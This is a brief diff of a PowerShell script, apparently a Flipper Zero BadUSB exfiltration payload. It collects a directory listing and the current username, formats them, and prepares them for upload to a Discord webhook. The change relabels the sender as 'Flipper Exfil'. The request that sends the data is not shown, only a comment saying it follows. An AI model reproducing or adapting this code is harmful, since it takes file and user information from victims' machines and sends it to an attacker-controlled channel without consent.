@@ -14,7 +14,7 @@ $r = Get-ChildItem | ForEach-Object {
 }
 
 # Format the custom object as a table in a Markdown code block
-$body = @{'username' = $env:username
+$body = @{'username' = $env:username + " on Flipper Exfil"
 content = "``````"+($r | Format-Table | Out-String)+"``````"}
 
 # Send the formatted table to a Discord webhook
